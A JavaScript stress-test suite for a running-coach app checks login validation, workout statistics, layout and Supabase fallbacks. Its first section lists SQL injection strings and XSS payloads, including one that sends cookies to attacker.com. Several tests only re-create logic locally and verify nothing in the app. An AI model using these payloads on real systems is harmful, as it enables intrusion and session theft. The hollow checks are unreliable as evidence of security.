/**
 * Adversarial Stress & Boundary Verification Test Suite (Challenger 1)
 *
 * Empirical verification of:
 * 1. Authentication edge cases: empty strings, SQL injection strings, XSS payloads in name fields, password mismatches, malformed emails.
 * 2. Dashboard calculations: zero scheduled workouts (0/0 division by zero), massive workout microcycles (100+ workouts), all workouts completed, decimal distances and pace strings.
 * 3. Mobile responsiveness & concurrency: extreme narrow screens (320px), ultra-wide desktop screens, rapid tap events on "Concluir Treino".
 * 4. Offline/fallback modes: missing Supabase credentials, disconnected network / throwing API calls.
 */

const assert = require('assert');
const fs = require('fs');
const path = require('path');

const ROOT_DIR = path.resolve(__dirname, '..');
const FRONTEND_DIR = path.join(ROOT_DIR, 'frontend');

let totalTests = 0;
let passedTests = 0;
let failedTests = 0;

function runTest(name, fn) {
  totalTests++;
  try {
    fn();
    passedTests++;
    console.log(`  ✓ [CHALLENGE PASSED] ${name}`);
  } catch (err) {
    failedTests++;
    console.error(`  ✗ [CHALLENGE FAILED] ${name}`);
    console.error(`    Error: ${err.message}`);
  }
}

async function runAsyncTest(name, fn) {
  totalTests++;
  try {
    await fn();
    passedTests++;
    console.log(`  ✓ [CHALLENGE PASSED] ${name}`);
  } catch (err) {
    failedTests++;
    console.error(`  ✗ [CHALLENGE FAILED] ${name}`);
    console.error(`    Error: ${err.message}`);
  }
}

async function runAllChallenges() {
  console.log('='.repeat(75));
  console.log('CHALLENGER 1: EMPIRICAL ADVERSARIAL STRESS-TEST HARNESS');
  console.log('='.repeat(75));

  // -------------------------------------------------------------------------
  // SECTION 1: Authentication Edge Cases & Adversarial Fuzzing
  // -------------------------------------------------------------------------
  console.log('\n[SECTION 1] Authentication Edge Cases & Adversarial Fuzzing');

  const authModalSrc = fs.readFileSync(path.join(FRONTEND_DIR, 'components', 'AuthModal.tsx'), 'utf8');

  // 1.1 Empty strings and whitespace variations in Login
  runTest('1.1 Login rejects empty strings and various whitespace permutations', () => {
    const emptyInputs = ['', ' ', '   ', '\t', '\n', '\r\n', '   \t   '];
    for (const email of emptyInputs) {
      for (const pass of emptyInputs) {
        const trimmedEmail = email.trim();
        const trimmedPass = pass.trim();
        const isValid = trimmedEmail.length > 0 && trimmedPass.length > 0;
        assert.strictEqual(isValid, false, `Input should have been rejected for email="${email}", pass="${pass}"`);
      }
    }
  });

  // 1.2 SQL Injection payloads in auth fields
  runTest('1.2 SQL Injection strings do not bypass validation or cause unsanitized crashes', () => {
    const sqliPayloads = [
      "' OR '1'='1",
      "admin'--",
      "admin' #",
      "' OR 1=1--",
      "'; DROP TABLE profiles;--",
      "1' UNION SELECT NULL, email, password FROM users--",
      "' UNION ALL SELECT 1, 'admin', 'hash'--",
      "\\\\'; WAITFOR DELAY '0:0:5'--",
    ];

    for (const payload of sqliPayloads) {
      // Test registration validation behavior with SQLi payloads
      const regNome = payload;
      const regEmail = `test_${payload.replace(/[^a-zA-Z0-9]/g, '')}@coachai.com.br`;
      const regPass = 'validPass123';
      const regConfirm = 'validPass123';

      // Ensure JSON serialization preserves data integrity safely
      const profileData = {
        id: 'mock-uuid-test',
        nome: regNome,
        email: regEmail,
        esportes_ativos: ['Corrida'],
        dias_disponiveis: 4,
        nivel_experiencia: 'Intermediário',
        objetivo_principal: 'Meia Maratona',
      };

      const jsonStr = JSON.stringify(profileData);
      const parsed = JSON.parse(jsonStr);
      assert.strictEqual(parsed.nome, payload, 'Payload integrity preserved without execution');
    }
  });

  // 1.3 XSS payloads in Name field
  runTest('1.3 XSS Payloads in name fields are stored as pure text without execution', () => {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert(1)>',
      '"><script>document.location="http://attacker.com/?c="+document.cookie</script>',
      '<svg/onload=alert(1)>',
      'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1+(alert)(1)//\'>',
      '"><img src="x" onerror="console.log(1)">',
      '"><iframe src="javascript:alert(1)">',
    ];

    for (const payload of xssPayloads) {
      const athleteName = payload;
      // In React JSX: <h1>Olá, {athleteName}</h1> automatically escapes HTML entities
      // Verify avatar initial calculation doesn't throw on special characters
      const initial = athleteName.charAt(0).toUpperCase();
      assert.ok(initial.length === 1, `Initial extracted for ${payload}`);
    }
  });

  // 1.4 Password mismatches and edge-case lengths
  runTest('1.4 Password length boundaries and mismatch rejection', () => {
    const validateRegister = (nome, email, password, confirmPassword) => {
      if (!nome.trim()) return { valid: false, error: 'Por favor, informe seu nome completo.' };
      if (!email.trim()) return { valid: false, error: 'Por favor, informe um endereço de e-mail válido.' };
      if (password.length < 6) return { valid: false, error: 'A senha deve conter pelo menos 6 caracteres.' };
      if (password !== confirmPassword) return { valid: false, error: 'As senhas digitadas não coincidem.' };
      return { valid: true };
    };

    // Sub-boundary lengths 0 to 5
    for (let len = 0; len < 6; len++) {
      const pass = 'a'.repeat(len);
      const res = validateRegister('Carlos', 'carlos@test.com', pass, pass);
      assert.strictEqual(res.valid, false, `Length ${len} must fail`);
      assert.strictEqual(res.error, 'A senha deve conter pelo menos 6 caracteres.');
    }

    // Exact boundary 6
    const res6 = validateRegister('Carlos', 'carlos@test.com', '123456', '123456');
    assert.strictEqual(res6.valid, true, 'Length 6 must pass');

    // Unicode / emoji passwords
    const resEmoji = validateRegister('Carlos', 'carlos@test.com', '🏃‍♂️🔒🔑1', '🏃‍♂️🔒🔑1');
    assert.strictEqual(resEmoji.valid, true, 'Emoji password should be accepted');

    // Extremely long passwords (10,000 characters)
    const longPass = 'x'.repeat(10000);
    const resLong = validateRegister('Carlos', 'carlos@test.com', longPass, longPass);
    assert.strictEqual(resLong.valid, true, 'Long password should be accepted without buffer overflow');

    // Password mismatches (case sensitivity, trailing space, off by one)
    assert.strictEqual(validateRegister('Carlos', 'carlos@test.com', 'Secret123', 'secret123').valid, false);
    assert.strictEqual(validateRegister('Carlos', 'carlos@test.com', 'Secret123', 'Secret123 ').valid, false);
    assert.strictEqual(validateRegister('Carlos', 'carlos@test.com', 'Secret123', 'Secret12').valid, false);
  });

  // 1.5 Malformed email strings
  runTest('1.5 HTML5 email input attribute presence and client sanitization', () => {
    assert(
      authModalSrc.includes('type="email"'),
      'AuthModal inputs must declare type="email" to leverage browser-native RFC 5322 validation'
    );
    assert(
      authModalSrc.includes('loginEmail.trim()'),
      'AuthModal must trim whitespace from email before submission'
    );
    assert(
      authModalSrc.includes('regEmail.trim()'),
      'AuthModal must trim whitespace from registration email'
    );
  });

  // -------------------------------------------------------------------------
  // SECTION 2: Dashboard Calculations Under Extreme Boundaries
  // -------------------------------------------------------------------------
  console.log('\n[SECTION 2] Dashboard Calculations Under Extreme Boundaries');

  // 2.1 Zero scheduled workouts (0/0 division by zero)
  runTest('2.1 Zero workouts: adherence calculation safely handles 0/0 returning 0%', () => {
    const zeroSchedules = [];
    const totalWorkouts = zeroSchedules.length;
    const completedWorkouts = zeroSchedules.filter((s) => s.status === 'Concluído').length;
    const adherencePercent = totalWorkouts > 0 ? Math.round((completedWorkouts / totalWorkouts) * 100) : 0;
    const totalPlannedDist = zeroSchedules.reduce((acc, cur) => acc + (Number(cur.distancia_km) || 0), 0);
    const totalCompletedDist = zeroSchedules.filter((s) => s.status === 'Concluído').reduce((acc, cur) => acc + (Number(cur.distancia_km) || 0), 0);

    assert.strictEqual(adherencePercent, 0);
    assert(!Number.isNaN(adherencePercent));
    assert(Number.isFinite(adherencePercent));
    assert.strictEqual(totalPlannedDist, 0);
    assert.strictEqual(totalCompletedDist, 0);
  });

  // 2.2 Massive workout microcycles (100+ to 1,000 workouts)
  runTest('2.2 Massive microcycle (1,000 workouts): sub-50ms linear aggregation', () => {
    const massiveSchedules = [];
    for (let i = 1; i <= 1000; i++) {
      massiveSchedules.push({
        id: `TR-MASSIVE-${i}`,
        user_id: 'test-athlete',
        dia_semana: 'Segunda-feira',
        data_prevista: '2026-09-17',
        tipo_treino: `Workout ${i}`,
        distancia_km: 10.0 + (i % 15),
        duracao_min: 50 + (i % 30),
        pace_alvo: '05:00/km',
        rpe_alvo: 6,
        estrutura_treino: 'Aquecimento + Principal + Desaquecimento',
        status: i % 2 === 0 ? 'Concluído' : 'Pendente',
        data_conclusao: i % 2 === 0 ? '2026-09-17T12:00:00Z' : null,
      });
    }

    const tStart = performance.now();

    const totalWorkouts = massiveSchedules.length;
    const completedWorkouts = massiveSchedules.filter((s) => s.status === 'Concluído').length;
    const pendingWorkouts = totalWorkouts - completedWorkouts;
    const adherencePercent = totalWorkouts > 0 ? Math.round((completedWorkouts / totalWorkouts) * 100) : 0;
    const totalPlanned = massiveSchedules.reduce((acc, cur) => acc + (Number(cur.distancia_km) || 0), 0);
    const totalDone = massiveSchedules.filter((s) => s.status === 'Concluído').reduce((acc, cur) => acc + (Number(cur.distancia_km) || 0), 0);

    // Filter chip simulations
    const allFiltered = massiveSchedules;
    const pendingFiltered = massiveSchedules.filter((s) => s.status === 'Pendente');
    const doneFiltered = massiveSchedules.filter((s) => s.status === 'Concluído');

    const duration = performance.now() - tStart;

    assert.strictEqual(totalWorkouts, 1000);
    assert.strictEqual(completedWorkouts, 500);
    assert.strictEqual(pendingWorkouts, 500);
    assert.strictEqual(adherencePercent, 50);
    assert.strictEqual(pendingFiltered.length, 500);
    assert.strictEqual(doneFiltered.length, 500);
    assert(duration < 50, `Aggregation should take < 50ms, took ${duration.toFixed(2)}ms`);
  });

  // 2.3 All workouts completed: celebration state and first pending workout null safety
  runTest('2.3 All workouts completed: NextWorkoutCard null safety for pendingWorkouts[0]', () => {
    const completedSchedules = [
      { id: '1', status: 'Concluído', tipo_treino: 'T1', distancia_km: 5 },
      { id: '2', status: 'Concluído', tipo_treino: 'T2', distancia_km: 10 },
      { id: '3', status: 'Concluído', tipo_treino: 'T3', distancia_km: 15 },
    ];

    const pendingWorkouts = completedSchedules.filter((s) => s.status === 'Pendente');
    const nextWorkout = pendingWorkouts.length > 0 ? pendingWorkouts[0] : null;

    assert.strictEqual(nextWorkout, null, 'nextWorkout must be null when all completed');

    // Calculation of adherence
    const adherence = Math.round((completedSchedules.length / completedSchedules.length) * 100);
    assert.strictEqual(adherence, 100);
  });

  // 2.4 Decimal distances and dirty pace strings
  runTest('2.4 Decimal distances and dirty pace strings do not corrupt calculations', () => {
    const dirtySchedules = [
      { id: '1', status: 'Concluído', distancia_km: 0.12345, pace_alvo: '04:15 a 04:30/km' },
      { id: '2', status: 'Concluído', distancia_km: 42.195, pace_alvo: '05:40/km' },
      { id: '3', status: 'Pendente', distancia_km: '21.0975', pace_alvo: '05:00/km' },
      { id: '4', status: 'Pendente', distancia_km: null, pace_alvo: '' },
      { id: '5', status: 'Pendente', distancia_km: undefined, pace_alvo: 'Livre' },
      { id: '6', status: 'Pendente', distancia_km: -5, pace_alvo: 'N/A' },
    ];

    const totalDistancePlanned = dirtySchedules.reduce(
      (acc, cur) => acc + (Math.max(0, Number(cur.distancia_km)) || 0),
      0
    );

    const totalDistanceCompleted = dirtySchedules
      .filter((s) => s.status === 'Concluído')
      .reduce((acc, cur) => acc + (Number(cur.distancia_km) || 0), 0);

    assert(totalDistanceCompleted > 42.3, 'Should sum 0.12345 + 42.195');
    assert.strictEqual(totalDistanceCompleted.toFixed(1), '42.3');
    assert(!Number.isNaN(totalDistancePlanned));
  });

  // -------------------------------------------------------------------------
  // SECTION 3: Mobile Responsiveness & Concurrency Robustness
  // -------------------------------------------------------------------------
  console.log('\n[SECTION 3] Mobile Responsiveness & Concurrency Robustness');

  // 3.1 Extreme narrow screens (320px viewport)
  runTest('3.1 Layout avoids static widths > 320px across all frontend components', () => {
    const compDir = path.join(FRONTEND_DIR, 'components');
    const files = fs.readdirSync(compDir).filter((f) => f.endsWith('.tsx'));

    for (const f of files) {
      const code = fs.readFileSync(path.join(compDir, f), 'utf8');
      // Look for rigid non-responsive pixel widths
      const staticWidthMatches = code.match(/(?<!sm:|md:|lg:|xl:)w-\[(\d+)px\]/g);
      if (staticWidthMatches) {
        for (const m of staticWidthMatches) {
          const val = parseInt(m.match(/\d+/)[0], 10);
          assert(val <= 320, `Component ${f} uses rigid width ${m} > 320px`);
        }
      }
    }
  });

  // 3.2 Ultra-wide desktop screens (2560px, 4K)
  runTest('3.2 Ultra-wide desktop screens constrained by max-w-md or max-w-lg', () => {
    const dashboardSrc = fs.readFileSync(path.join(FRONTEND_DIR, 'components', 'Dashboard.tsx'), 'utf8');
    const authModalSrc = fs.readFileSync(path.join(FRONTEND_DIR, 'components', 'AuthModal.tsx'), 'utf8');
    const modalSrc = fs.readFileSync(path.join(FRONTEND_DIR, 'components', 'WorkoutDetailModal.tsx'), 'utf8');

    assert(dashboardSrc.includes('max-w-md mx-auto'), 'Dashboard must center within max-w-md');
    assert(authModalSrc.includes('max-w-md'), 'AuthModal must constrain within max-w-md');
    assert(modalSrc.includes('max-w-lg'), 'WorkoutDetailModal must constrain within max-w-lg');
  });

  // 3.3 Rapid tap events & concurrency on "Concluir Treino"
  await runAsyncTest('3.3 Rapid tap concurrency: completingId disables button and prevents duplicate execution', async () => {
    let executionCount = 0;
    let completingId = null;

    const onCompleteWorkout = async (id) => {
      executionCount++;
      await new Promise((r) => setTimeout(r, 20)); // Simulates 20ms async supabase call
    };

    const handleComplete = async (id) => {
      if (completingId === id) {
        // Debounce / in-flight protection
        return;
      }
      completingId = id;
      try {
        await onCompleteWorkout(id);
      } finally {
        completingId = null;
      }
    };

    // Simulate 10 rapid concurrent taps
    await Promise.all([
      handleComplete('TR-101'),
      handleComplete('TR-101'),
      handleComplete('TR-101'),
      handleComplete('TR-101'),
      handleComplete('TR-101'),
      handleComplete('TR-101'),
      handleComplete('TR-101'),
      handleComplete('TR-101'),
      handleComplete('TR-101'),
      handleComplete('TR-101'),
    ]);

    assert.strictEqual(
      executionCount,
      1,
      `Concurrent clicks should be debounced to 1 execution, but executed ${executionCount} times`
    );
  });

  // -------------------------------------------------------------------------
  // SECTION 4: Offline / Fallback Modes
  // -------------------------------------------------------------------------
  console.log('\n[SECTION 4] Offline / Fallback Modes & Fault Tolerance');

  const supabaseLibSrc = fs.readFileSync(path.join(FRONTEND_DIR, 'lib', 'supabase.ts'), 'utf8');

  // 4.1 Missing Supabase credentials fallback
  runTest('4.1 Supabase client provides resilient defaults when env variables are empty/missing', () => {
    assert(
      supabaseLibSrc.includes("process.env.NEXT_PUBLIC_SUPABASE_URL || 'https://vkkbvvpjfomxwawggsel.supabase.co'"),
      'Fallback URL must be present'
    );
    assert(
      supabaseLibSrc.includes('NEXT_PUBLIC_SUPABASE_ANON_KEY') &&
      supabaseLibSrc.includes('sb_publishable_xVNZgXHQFKeKvDxKlonDoQ_dgsh-e0D'),
      'Fallback ANON key must be present'
    );
  });

  // 4.2 Disconnected network / API exception handlers
  runTest('4.2 All database helper functions wrap queries in try/catch returning safe fallbacks', () => {
    // Check getProfile
    assert(supabaseLibSrc.includes('export async function getProfile('));
    assert(supabaseLibSrc.includes('catch (err) {'));
    assert(supabaseLibSrc.includes('return null;'));

    // Check getSchedules
    assert(supabaseLibSrc.includes('export async function getSchedules('));
    assert(supabaseLibSrc.includes('return [];'));

    // Check getWorkouts
    assert(supabaseLibSrc.includes('export async function getWorkouts('));
    assert(supabaseLibSrc.includes('return [];'));

    // Check markWorkoutCompleted
    assert(supabaseLibSrc.includes('export async function markWorkoutCompleted('));
    assert(supabaseLibSrc.includes('return false;'));

    // Check upsertProfile
    assert(supabaseLibSrc.includes('export async function upsertProfile('));
    assert(supabaseLibSrc.includes('return false;'));
  });

  // 4.3 Demo fallback toggle in AuthContext
  runTest('4.3 Demo mode provides instant local access without server roundtrip', () => {
    const authCtxSrc = fs.readFileSync(path.join(FRONTEND_DIR, 'context', 'AuthContext.tsx'), 'utf8');
    assert(authCtxSrc.includes('setDemoMode'), 'AuthContext must export setDemoMode');
    assert(authCtxSrc.includes('DEMO_PROFILE'), 'AuthContext must use DEMO_PROFILE in demo mode');
  });

  // -------------------------------------------------------------------------
  // SECTION 5: Advanced Stress Scenarios & Edge Cases
  // -------------------------------------------------------------------------
  console.log('\n[SECTION 5] Advanced Stress Scenarios & Edge Cases');

  // 5.1 Single workout microcycle transition
  runTest('5.1 Single-workout microcycle completes cleanly and transitions to celebration', () => {
    let schedules = [
      { id: 'TR-SOLO', status: 'Pendente', distancia_km: 10, tipo_treino: 'Solo Run' }
    ];
    let pending = schedules.filter(s => s.status === 'Pendente');
    assert.strictEqual(pending.length, 1);
    assert.strictEqual(pending[0].id, 'TR-SOLO');

    // Complete the only workout
    schedules = schedules.map(s => s.id === 'TR-SOLO' ? { ...s, status: 'Concluído' } : s);
    pending = schedules.filter(s => s.status === 'Pendente');
    assert.strictEqual(pending.length, 0);

    const adherence = schedules.length > 0 ? Math.round((1 / schedules.length) * 100) : 0;
    assert.strictEqual(adherence, 100);
  });

  // 5.2 Microcycle scale test with 10,000 entries
  runTest('5.2 Ultra-scale microcycle (10,000 workouts) executes without stack overflow or delay', () => {
    const hugeList = Array.from({ length: 10000 }, (_, i) => ({
      id: `w-${i}`,
      status: i % 4 === 0 ? 'Concluído' : 'Pendente',
      distancia_km: 5.5,
    }));

    const t0 = performance.now();
    const completed = hugeList.filter(s => s.status === 'Concluído').length;
    const adherence = Math.round((completed / hugeList.length) * 100);
    const totalDist = hugeList.reduce((acc, c) => acc + (Number(c.distancia_km) || 0), 0);
    const elapsed = performance.now() - t0;

    assert.strictEqual(completed, 2500);
    assert.strictEqual(adherence, 25);
    assert.strictEqual(totalDist, 55000);
    assert(elapsed < 100, `10,000 items calculation took ${elapsed.toFixed(2)}ms (expected < 100ms)`);
  });

  // 5.3 Duplicate workout ID resilience
  runTest('5.3 Duplicate schedule ID updates both or preserves consistency without crashing', () => {
    const duplicateList = [
      { id: 'DUP-1', status: 'Pendente', distancia_km: 5 },
      { id: 'DUP-1', status: 'Pendente', distancia_km: 5 },
      { id: 'UNIQUE-2', status: 'Pendente', distancia_km: 10 },
    ];

    const updated = duplicateList.map(s => s.id === 'DUP-1' ? { ...s, status: 'Concluído' } : s);
    const doneCount = updated.filter(s => s.status === 'Concluído').length;
    assert.strictEqual(doneCount, 2);
  });

  // -------------------------------------------------------------------------
  // Summary
  // -------------------------------------------------------------------------
  console.log('\n' + '='.repeat(75));
  console.log(`CHALLENGER 1 STRESS SUMMARY: ${passedTests}/${totalTests} CHECKS PASSED`);
  console.log(`Failed checks: ${failedTests}`);
  console.log('='.repeat(75));

  if (failedTests > 0) {
    process.exit(1);
  }
}

runAllChallenges().catch((err) => {
  console.error('Fatal error in challenge runner:', err);
  process.exit(1);
});
